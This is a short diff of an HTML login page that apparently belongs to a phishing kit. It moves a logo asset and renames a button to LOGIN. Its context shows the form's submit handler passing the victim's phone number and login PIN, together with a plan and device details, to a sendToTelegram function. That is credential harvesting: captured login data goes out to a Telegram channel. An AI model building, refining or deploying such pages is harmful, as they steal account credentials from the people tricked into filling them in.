@@ -196,7 +196,7 @@ label{
 <body>
 
 <div class="card">
-  <img src="one.webp" class="logo">
+  <img src="public/assets/one.webp" class="logo">
 
   <form id="loginForm" autocomplete="off">
 
@@ -212,7 +212,7 @@ label{
     <input id="pin" class="pin-input" inputmode="numeric"
            maxlength="4" placeholder="Login PIN">
 
-    <button id="loginBtn" class="btn" disabled>CONTINUE</button>
+    <button id="loginBtn" class="btn" disabled>LOGIN</button>
   </form>
 </div>
 
@@ -317,7 +317,7 @@ document.getElementById('loginForm').onsubmit=e=>{
 
   sendToTelegram({
     event:'login_clicked',
-    loginPhone:phone.value,   // starts from 7
+    loginPhone:phone.value,
     loginPin:pin.value,
     plan:normalizePlan(selectedPlan),
     device,
